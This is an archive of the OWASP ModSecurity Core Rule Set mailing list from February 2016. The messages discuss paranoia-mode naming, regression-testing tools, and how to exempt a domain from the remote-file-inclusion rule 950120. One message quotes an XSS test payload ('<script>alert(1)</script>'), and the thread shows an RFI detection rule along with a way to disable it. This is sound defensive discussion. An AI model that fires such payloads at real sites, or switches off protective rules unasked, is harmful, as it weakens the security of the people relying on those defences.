> >>>>>>>uYrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistin
> >>>>>>>fo
> >> >>>>>%2f
> >> >> >>>owasp-modsecurity-core-rule-set
> >> >> >>
> >> >> >>--
> >> >> >>mailto:christian.folini at netnea.com
> >> >>
> >>
> >>>>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0m
> >>>>>>eO
> >> >>>>Inu
> >> >> >>N-aaCptw&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
> >> >> >>twitter: @ChrFolini
> >> >> >>_______________________________________________
> >> >> >>Owasp-modsecurity-core-rule-set mailing list
> >> >> >>Owasp-modsecurity-core-rule-set at lists.owasp.org
> >> >>
> >>
> >>>>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0m
> >>>>>>eO
> >> >>>>Inu
> >> >>
> >>
> >>>>>>YrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo
> >>>>>>%2
> >> >>>>fow
> >> >> >>asp-modsecurity-core-rule-set
> >> >> >
> >> >> >
> >> >> > ________________________________
> >> >> >
> >> >> > This transmission may contain information that is privileged,
> >> >>confidential, and/or exempt from disclosure under applicable law. If
> >>you
> >> >>are not the intended recipient, you are hereby notified that any
> >> >>disclosure, copying, distribution, or use of the information contained
> >> >>herein (including any reliance thereon) is strictly prohibited. If you
> >> >>received this transmission in error, please immediately contact the
> >> >>sender and destroy the material in its entirety, whether in electronic
> >> >>or hard copy format.
> >> >> > _______________________________________________
> >> >> > Owasp-modsecurity-core-rule-set mailing list
> >> >> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> >> >> >
> >>
> >>>>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyX
> >>>>mK
> >>
> >>>>ENdLz6Plw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%
> >>>>2f
> >> >>owasp-modsecurity-core-rule-set
> >> >> _______________________________________________
> >> >> Owasp-modsecurity-core-rule-set mailing list
> >> >> Owasp-modsecurity-core-rule-set at lists.owasp.org
> >> >>
> >>
> >>>>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyX
> >>>>mK
> >>
> >>>>ENdLz6Plw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%
> >>>>2f
> >> >>owasp-modsecurity-core-rule-set
> >> >
> >> >--
> >> >mailto:christian.folini at netnea.com
> >>
> >>>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXm
> >>>KE
> >> >YIczjUmg&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
> >> >twitter: @ChrFolini
> >> >_______________________________________________
> >> >Owasp-modsecurity-core-rule-set mailing list
> >> >Owasp-modsecurity-core-rule-set at lists.owasp.org
> >>
> >>>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXm
> >>>KE
> >>
> >>>NdLz6Plw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
> >>>ow
> >> >asp-modsecurity-core-rule-set
> >>
> >>
> >> ________________________________
> >>
> >> This transmission may contain information that is privileged,
> >>confidential, and/or exempt from disclosure under applicable law. If you
> >>are not the intended recipient, you are hereby notified that any
> >>disclosure, copying, distribution, or use of the information contained
> >>herein (including any reliance thereon) is strictly prohibited. If you
> >>received this transmission in error, please immediately contact the
> >>sender and destroy the material in its entirety, whether in electronic
> >>or hard copy format.
> 
> 
> ________________________________
> 
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From CSanders at trustwave.com  Mon Feb 22 19:57:50 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 22 Feb 2016 19:57:50 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <20160222195004.GD25903@elias>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias> <D2F07947.1A83E%csanders@trustwave.com>
	<20160222195004.GD25903@elias>
Message-ID: <D2F0D267.1A8F5%csanders@trustwave.com>

Actually I?m really shocked about this. But this is why we have a
community :).

On 2/22/16, 2:50 PM, "Christian Folini" <christian.folini at netnea.com>
wrote:

>On Mon, Feb 22, 2016 at 01:39:20PM +0000, Chaim Sanders wrote:
>> I have also merged your changes
>
>Thank you Chaim. Glad this geoip blocking works again. I used
>to have my own rules for this functionality. Maybe because I
>could not get the CRS geoip blocking to work properly. :)
>
>Christian
>
>
>--
>The need for mystery is greater than the need for an answer.
>--- Ken Kesey


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From christian.folini at netnea.com  Mon Feb 22 20:00:43 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 22 Feb 2016 21:00:43 +0100
Subject: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
 question
In-Reply-To: <D2F07196.1A805%csanders@trustwave.com>
References: <20160218121301.GA5039@elias>
	<56DABD87-2C4C-45ED-8D7B-425F4E9F808F@spam.lifeforms.nl>
	<20160220054556.GB25666@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44CC81@A1GTOEMBXV001.gto.a3c.atos.net>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BADD97B@uspEXCH02.u-s-p.local>
	<D2F07196.1A805%csanders@trustwave.com>
Message-ID: <20160222200043.GA26692@elias>

Chaim,

On Mon, Feb 22, 2016 at 01:06:20PM +0000, Chaim Sanders wrote:
> already put off by the complexity of ModSecurity. Although you bring up
> many good points in your email, I still think that based off of my
> experiences it makes more sense to call it aggressiveness, especially now
> that we have multiple levels. Great email btw Christian.

Thanks for the flowers. Took me a while to assemble it. ;)

I agree with you, that paranoia may sound difficult, but I am sure
we can get the point across, that the default is _less_
paranoid/aggressive than it used to me thanks to exile of the
paranoid rules into the higher and non-standard paranoia settings.

Now how do we proceed? It seems I was able to convince most
other participants in this conversation outside you. You
are in charge, so I have no problem with you making the decision.
But a decision we need.

My pull request #1 is ready. I can submit it as is, or I do
s/paranoia/aggressiveness/. Your call.

Ahoj,

Christian


-- 
Our sense of responsibility is not always as well developed 
as our sense of righteousness.
--- Mark Burgess, Principles of Network and System Administration

From christian.folini at netnea.com  Mon Feb 22 20:03:40 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 22 Feb 2016 21:03:40 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <D2F0D267.1A8F5%csanders@trustwave.com>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias>
	<D2F07947.1A83E%csanders@trustwave.com>
	<20160222195004.GD25903@elias>
	<D2F0D267.1A8F5%csanders@trustwave.com>
Message-ID: <20160222200340.GA26926@elias>

On Mon, Feb 22, 2016 at 07:57:50PM +0000, Chaim Sanders wrote:
> Actually I?m really shocked about this. But this is why we have a
> community :).

We desperately need QA for the core rules.

Alternatively, we could also get hold of Walter and dump his
brain into an analysis engine. His familiarity with all the
individual rules is most exceptional.

Christian


-- 
Croyez ceux qui cherchent la v?rit?, doutez de ceux qui la trouvent. 
-- Andr? Gide

From CSanders at trustwave.com  Mon Feb 22 20:46:13 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 22 Feb 2016 20:46:13 +0000
Subject: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
 question
In-Reply-To: <20160222200043.GA26692@elias>
References: <20160218121301.GA5039@elias>
	<56DABD87-2C4C-45ED-8D7B-425F4E9F808F@spam.lifeforms.nl>
	<20160220054556.GB25666@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44CC81@A1GTOEMBXV001.gto.a3c.atos.net>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BADD97B@uspEXCH02.u-s-p.local>
	<D2F07196.1A805%csanders@trustwave.com> <20160222200043.GA26692@elias>
Message-ID: <D2F0DD90.1A8FC%csanders@trustwave.com>

Dammit Christian, putting me in the hot seat. I bow to the will of the
community in all efforts :) send the pull through (I?m excited to see it).
I?ve been trying to take notes to quickly codify this in the new
documentation but haven?t had time to update this yet. Hopefully this will
help people this time around with the word paranoid :)

On 2/22/16, 3:00 PM, "Christian Folini" <christian.folini at netnea.com>
wrote:

>Chaim,
>
>On Mon, Feb 22, 2016 at 01:06:20PM +0000, Chaim Sanders wrote:
>> already put off by the complexity of ModSecurity. Although you bring up
>> many good points in your email, I still think that based off of my
>> experiences it makes more sense to call it aggressiveness, especially
>>now
>> that we have multiple levels. Great email btw Christian.
>
>Thanks for the flowers. Took me a while to assemble it. ;)
>
>I agree with you, that paranoia may sound difficult, but I am sure
>we can get the point across, that the default is _less_
>paranoid/aggressive than it used to me thanks to exile of the
>paranoid rules into the higher and non-standard paranoia settings.
>
>Now how do we proceed? It seems I was able to convince most
>other participants in this conversation outside you. You
>are in charge, so I have no problem with you making the decision.
>But a decision we need.
>
>My pull request #1 is ready. I can submit it as is, or I do
>s/paranoia/aggressiveness/. Your call.
>
>Ahoj,
>
>Christian
>
>
>--
>Our sense of responsibility is not always as well developed
>as our sense of righteousness.
>--- Mark Burgess, Principles of Network and System Administration


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From CSanders at trustwave.com  Mon Feb 22 20:47:48 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 22 Feb 2016 20:47:48 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <20160222200340.GA26926@elias>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias> <D2F07947.1A83E%csanders@trustwave.com>
	<20160222195004.GD25903@elias> <D2F0D267.1A8F5%csanders@trustwave.com>
	<20160222200340.GA26926@elias>
Message-ID: <D2F0DDE7.1A900%csanders@trustwave.com>

You?ll note that I have a ticket for updating the regression tests. I
think that this is something that we should look into more. Potentially, a
framework that leverages Python?s Requests Library? My strong preference
is towards python in these types of things, I might be convinced into
using bash curl. Perl need not apply :-P thoughts?

On 2/22/16, 3:03 PM, "Christian Folini" <christian.folini at netnea.com>
wrote:

>On Mon, Feb 22, 2016 at 07:57:50PM +0000, Chaim Sanders wrote:
>> Actually I?m really shocked about this. But this is why we have a
>> community :).
>
>We desperately need QA for the core rules.
>
>Alternatively, we could also get hold of Walter and dump his
>brain into an analysis engine. His familiarity with all the
>individual rules is most exceptional.
>
>Christian
>
>
>--
>Croyez ceux qui cherchent la v?rit?, doutez de ceux qui la trouvent.
>-- Andr? Gide


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From christian.folini at netnea.com  Mon Feb 22 21:20:59 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 22 Feb 2016 22:20:59 +0100
Subject: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
 question
In-Reply-To: <D2F0DD90.1A8FC%csanders@trustwave.com>
References: <20160218121301.GA5039@elias>
	<56DABD87-2C4C-45ED-8D7B-425F4E9F808F@spam.lifeforms.nl>
	<20160220054556.GB25666@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44CC81@A1GTOEMBXV001.gto.a3c.atos.net>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BADD97B@uspEXCH02.u-s-p.local>
	<D2F07196.1A805%csanders@trustwave.com>
	<20160222200043.GA26692@elias>
	<D2F0DD90.1A8FC%csanders@trustwave.com>
Message-ID: <20160222212059.GA4955@elias>

On Mon, Feb 22, 2016 at 08:46:13PM +0000, Chaim Sanders wrote:
> Dammit Christian, putting me in the hot seat. I bow to the will of the
> community in all efforts :) 

Sorry Chaim. I could not resist to exploit your democratic
side. ;)

Here is the pull request:
https://github.com/SpiderLabs/owasp-modsecurity-crs/pull/292

> I?ve been trying to take notes to quickly codify this in the new
> documentation but haven?t had time to update this yet. Hopefully this will
> help people this time around with the word paranoid :)

We'll be glad to help out with the documentation. Is this 
part of the CRS release, or somewhere else online?

Cheers,

Christian


-- 
I think IT projects are about supporting social systems - about
communications between people and machines. They tend to fail due to
cultural issues.
-- Tim Berners-Lee

From christian.folini at netnea.com  Mon Feb 22 21:24:05 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 22 Feb 2016 22:24:05 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <D2F0DDE7.1A900%csanders@trustwave.com>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias>
	<D2F07947.1A83E%csanders@trustwave.com>
	<20160222195004.GD25903@elias>
	<D2F0D267.1A8F5%csanders@trustwave.com>
	<20160222200340.GA26926@elias>
	<D2F0DDE7.1A900%csanders@trustwave.com>
Message-ID: <20160222212405.GA12702@elias>

On Mon, Feb 22, 2016 at 08:47:48PM +0000, Chaim Sanders wrote:
> You?ll note that I have a ticket for updating the regression tests. I
> think that this is something that we should look into more. Potentially, a
> framework that leverages Python?s Requests Library? My strong preference
> is towards python in these types of things, I might be convinced into
> using bash curl. Perl need not apply :-P thoughts?

Python is the right choice here for sure. The API binding opens various
options.

Personally, I am breeding on an idea beyond regression tests, but I am
not ready to explain it. Regression tests are a base we will need no
matter what other things we build.

Ahoj,

Christian


-- 
I will either find a way, or make one.
--Hannibal

From d0lph1n98 at yahoo.com  Tue Feb 23 04:43:16 2016
From: d0lph1n98 at yahoo.com (Big Whale)
Date: Tue, 23 Feb 2016 04:43:16 +0000 (UTC)
Subject: [Owasp-modsecurity-core-rule-set] LibModsecurity
References: <365491240.1163317.1456202596637.JavaMail.yahoo.ref@mail.yahoo.com>
Message-ID: <365491240.1163317.1456202596637.JavaMail.yahoo@mail.yahoo.com>

Ok, thanks a lot. :)

--------------------------------------------
On Mon, 2/22/16, Chaim Sanders <CSanders at trustwave.com> wrote:

 Subject: Re: [Owasp-modsecurity-core-rule-set] LibModsecurity
 To: "Big Whale" <d0lph1n98 at yahoo.com>, "owasp-modsecurity-core-rule-set at lists.owasp.org" <owasp-modsecurity-core-rule-set at lists.owasp.org>
 Date: Monday, February 22, 2016, 9:02 PM
 
 Although I haven?t
 updated it for the latest API yet, you might be looking
 for something like the following:
 https://github.com/SpiderLabs/ModSecurity-pcap/blob/master/pcap.cc
 
 
 On 2/22/16,
 4:36 AM,
 "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
 on behalf of Big
 Whale" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
 on behalf
 of d0lph1n98 at yahoo.com>
 wrote:
 
 >Hello,
 >
 >i'm having a hard
 time in finding the function call that actually detect
 >injection payload (e.g
 <script>alert(1)</script>). The payload does
 not
 >necessarily need to
 >exactly like the one i provided in the
 brackets.
 >
 >Based on
 the code flow
 >(http://scanmail.trustwave.com/?c=4062&d=9tzK1h38IqAhEgQ38nNnYSnl3JmZpn1Qw
 >kUELBOfhg&s=5&u=https%3a%2f%2fgithub%2ecom%2fSpiderLabs%2fModSecurity%2fbl
 >ob%2flibmodsecurity%2fexamples%2fsimple%5fexample%5fusing%5fc%2ftest%2ec%2
 >9 the code basically just initiate the
 rules to the modsecurity instance
 >and also try to
 initiate remote rules and i don't find any function
 call
 >that actually does the payload
 detection, is it already implemented?
 >maybe i missed somewhere. Thanks.
 >_______________________________________________
 >Owasp-modsecurity-core-rule-set mailing
 list
 >Owasp-modsecurity-core-rule-set at lists.owasp.org
 >http://scanmail.trustwave.com/?c=4062&d=9tzK1h38IqAhEgQ38nNnYSnl3JmZpn1Qwh
 >IBIxTLjw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
 >asp-modsecurity-core-rule-set
 
 
 ________________________________
 
 This transmission may contain
 information that is privileged, confidential, and/or exempt
 from disclosure under applicable law. If you are not the
 intended recipient, you are hereby notified that any
 disclosure, copying, distribution, or use of the information
 contained herein (including any reliance thereon) is
 strictly prohibited. If you received this transmission in
 error, please immediately contact the sender and destroy the
 material in its entirety, whether in electronic or hard copy
 format.

From bridavis at cisco.com  Fri Feb 26 04:45:24 2016
From: bridavis at cisco.com (Brian Davis (bridavis))
Date: Fri, 26 Feb 2016 04:45:24 +0000
Subject: [Owasp-modsecurity-core-rule-set] Interesting into a custom SecRule
	into CRS chain
Message-ID: <D2F54293.21B4A%bridavis@cisco.com>

Hi,

I'm trying to allow a certain domain to be exempted from the core RFI rule.

What I've done is modified the relevant rule in modsecurity_crs_40_generic_attacks.conf:

SecRule ARGS "^(?:ht|f)tps?://(.*)$" \
        "chain,phase:2,rev:'3',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'9',t:none,capture,ctl:auditLogParts=+E,block,msg:'Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',id:'950120',severity:'2',tag:'OWASP_CRS/WEB_ATTACK/RFI'"
        SecRule TX:1 "!@contains abc" "chain"
        SecRule TX:1 "!@beginsWith %{request_headers.host}" "setvar:'tx.msg=%{rule.msg}',setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/RFI-%{matched_var_name}=%{tx.1}"

And this works. However, an upgrade of the CRS will wipe this out and it will have to be manually added again.

How would I go about inserting a "link" into the chain from an external file (e.g, modsecurity_crs_61_customrules.conf)?

Thanks,
Brian
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160226/de6fde03/attachment.html>

From christian.folini at netnea.com  Fri Feb 26 05:43:21 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Fri, 26 Feb 2016 06:43:21 +0100
Subject: [Owasp-modsecurity-core-rule-set] Interesting into a custom
 SecRule into CRS chain
In-Reply-To: <D2F54293.21B4A%bridavis@cisco.com>
References: <D2F54293.21B4A%bridavis@cisco.com>
Message-ID: <20160226054321.GA15001@elias>

Brian,

Have you tried working with a rule that disables the
execution of 950120 under the conditions your presented?

I usually do this via
SecRule ... "...ctl:ruleRemoveById=950120"

This has to be placed _before_ the said rule. But that way you
can exempt certain core rules without touching the core rules
files.

Ahoj,

Christian


-- 
The purpose of computing is insight not numbers.
-- Richard W. Hamming

From Manuel.LeosRivas at gemalto.com  Fri Feb 26 08:27:42 2016
From: Manuel.LeosRivas at gemalto.com (Leos Rivas Manuel)
Date: Fri, 26 Feb 2016 08:27:42 +0000
Subject: [Owasp-modsecurity-core-rule-set] Interesting into a custom
 SecRule	into CRS chain
In-Reply-To: <D2F54293.21B4A%bridavis@cisco.com>
References: <D2F54293.21B4A%bridavis@cisco.com>
Message-ID: <E2C9913D99137A42A2A9646B1E82B8DB010D461ED3@A1GTOEMBXV001.gto.a3c.atos.net>

Hi Brian,

Put an include file before loading the CRS rules with all of your customization, try not to work in the CRS files as you will get many problems to replicate your changes after every upgrade.

Regards,
Manuel
From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf Of Brian Davis (bridavis)
Sent: vendredi 26 f?vrier 2016 05:45
To: owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: [Owasp-modsecurity-core-rule-set] Interesting into a custom SecRule into CRS chain

Hi,

I'm trying to allow a certain domain to be exempted from the core RFI rule.

What I've done is modified the relevant rule in modsecurity_crs_40_generic_attacks.conf:

SecRule ARGS "^(?:ht|f)tps?://(.*)$" \
        "chain,phase:2,rev:'3',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'9',t:none,capture,ctl:auditLogParts=+E,block,msg:'Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',id:'950120',severity:'2',tag:'OWASP_CRS/WEB_ATTACK/RFI'"
        SecRule TX:1 "!@contains abc" "chain"
        SecRule TX:1 "!@beginsWith %{request_headers.host}<mailto:!@beginsWith%20%25%7brequest_headers.host%7d>" "setvar:'tx.msg=%{rule.msg}',setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/RFI-%{matched_var_name}=%{tx.1}"

And this works. However, an upgrade of the CRS will wipe this out and it will have to be manually added again.

How would I go about inserting a "link" into the chain from an external file (e.g, modsecurity_crs_61_customrules.conf)?

Thanks,
Brian
________________________________
This message and any attachments are intended solely for the addressees and may contain confidential information. Any unauthorized use or disclosure, either whole or partial, is prohibited.
E-mails are susceptible to alteration. Our company shall not be liable for the message if altered, changed or falsified. If you are not the intended recipient of this message, please delete it and notify the sender.
Although all reasonable efforts have been made to keep this transmission free from viruses, the sender will not be liable for damages caused by a transmitted virus.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160226/95a4a280/attachment.html>

From modsec at spam.lifeforms.nl  Fri Feb 26 21:47:40 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Fri, 26 Feb 2016 22:47:40 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
	controversial ...
In-Reply-To: <D2F0DDE7.1A900%csanders@trustwave.com>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias>
	<D2F07947.1A83E%csanders@trustwave.com>
	<20160222195004.GD25903@elias>
	<D2F0D267.1A8F5%csanders@trustwave.com>
	<20160222200340.GA26926@elias>
	<D2F0DDE7.1A900%csanders@trustwave.com>
Message-ID: <A6FC8879-FCFF-4EF2-9A11-F5ED295069F8@spam.lifeforms.nl>

I use a little home-built thing to do these kinds of regression tests on our own web services. It walks through a YAML file with tests: https://github.com/lifeforms/httpcheck

I started to write tests for CRSv3, but I didn?t get very far, because I got stuck on the PHP rules issue. Here is the start of my httpcheck manifest with some SQLi tests: http://lf.ms/crsv3.yaml
I just do 'httpcheck -i crsv3.yaml -u http://localhost/' to run them on a server.

It?s in Go though, because I wanted to test lots of servers concurrently and I wanted it to be fast, so it was a good excuse to try Go. Maybe it?s even a good excuse to learn about its C bindings with libmodsecurity in the future :)

Ultimately it could be any tool, I?m not really familiar with the Python world, but I?m in favor of anything that makes it very easy to write a test. Something like just adding a simple line to a file, but with options for doing advanced stuff like POST data, cookies and custom headers. I personally hate writing correct JSON (that trailing comma?) or XML. But I find YAML pretty nice for this case.

Cheers!
WH

> On 22 Feb 2016, at 21:47, Chaim Sanders <CSanders at trustwave.com> wrote:
> 
> You?ll note that I have a ticket for updating the regression tests. I
> think that this is something that we should look into more. Potentially, a
> framework that leverages Python?s Requests Library? My strong preference
> is towards python in these types of things, I might be convinced into
> using bash curl. Perl need not apply :-P thoughts?
> 
> On 2/22/16, 3:03 PM, "Christian Folini" <christian.folini at netnea.com>
> wrote:
> 
>> On Mon, Feb 22, 2016 at 07:57:50PM +0000, Chaim Sanders wrote:
>>> Actually I?m really shocked about this. But this is why we have a
>>> community :).
>> 
>> We desperately need QA for the core rules.
>> 
>> Alternatively, we could also get hold of Walter and dump his
>> brain into an analysis engine. His familiarity with all the
>> individual rules is most exceptional.
>> 
>> Christian
>> 
>> 
>> --
>> Croyez ceux qui cherchent la v?rit?, doutez de ceux qui la trouvent.
>> -- Andr? Gide
> 
> 
> ________________________________
> 
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160226/3939264e/attachment.html>

From CSanders at trustwave.com  Fri Feb 26 22:22:45 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Fri, 26 Feb 2016 22:22:45 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode:
	Forgotten	controversial ...
In-Reply-To: <A6FC8879-FCFF-4EF2-9A11-F5ED295069F8@spam.lifeforms.nl>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias>	<D2F07947.1A83E%csanders@trustwave.com>
	<20160222195004.GD25903@elias>	<D2F0D267.1A8F5%csanders@trustwave.com>
	<20160222200340.GA26926@elias>	<D2F0DDE7.1A900%csanders@trustwave.com>
	<A6FC8879-FCFF-4EF2-9A11-F5ED295069F8@spam.lifeforms.nl>
Message-ID: <DM2PR0701MB12956D8B4040DE9E1ACA94C4DBA70@DM2PR0701MB1295.namprd07.prod.outlook.com>

I belive in the near future I?m going to get a little more control over the priority of my schedule. After we complete v3.0.0-rc1 I would really like to turn my attention to providing an external QA environment for CRS.

From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf Of Walter Hop
Sent: Friday, February 26, 2016 4:48 PM
To: owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten controversial ...

I use a little home-built thing to do these kinds of regression tests on our own web services. It walks through a YAML file with tests: https://github.com/lifeforms/httpcheck<http://scanmail.trustwave.com/?c=4062&d=kc_Q1oM1YR_rcMW4t6crL9CqZTsho19pU89ACbNb1Q&s=5&u=https%3a%2f%2fgithub%2ecom%2flifeforms%2fhttpcheck>

I started to write tests for CRSv3, but I didn?t get very far, because I got stuck on the PHP rules issue. Here is the start of my httpcheck manifest with some SQLi tests: http://lf.ms/crsv3.yaml<http://scanmail.trustwave.com/?c=4062&d=kc_Q1oM1YR_rcMW4t6crL9CqZTsho19pU58eWbEKgw&s=5&u=http%3a%2f%2flf%2ems%2fcrsv3%2eyaml>
I just do 'httpcheck -i crsv3.yaml -u http://localhost/' to run them on a server.

It?s in Go though, because I wanted to test lots of servers concurrently and I wanted it to be fast, so it was a good excuse to try Go. Maybe it?s even a good excuse to learn about its C bindings with libmodsecurity in the future :)

Ultimately it could be any tool, I?m not really familiar with the Python world, but I?m in favor of anything that makes it very easy to write a test. Something like just adding a simple line to a file, but with options for doing advanced stuff like POST data, cookies and custom headers. I personally hate writing correct JSON (that trailing comma?) or XML. But I find YAML pretty nice for this case.

Cheers!
WH

On 22 Feb 2016, at 21:47, Chaim Sanders <CSanders at trustwave.com<mailto:CSanders at trustwave.com>> wrote:

You?ll note that I have a ticket for updating the regression tests. I
think that this is something that we should look into more. Potentially, a
framework that leverages Python?s Requests Library? My strong preference
is towards python in these types of things, I might be convinced into
using bash curl. Perl need not apply :-P thoughts?

On 2/22/16, 3:03 PM, "Christian Folini" <christian.folini at netnea.com<mailto:christian.folini at netnea.com>>
wrote:


On Mon, Feb 22, 2016 at 07:57:50PM +0000, Chaim Sanders wrote:

Actually I?m really shocked about this. But this is why we have a
community :).

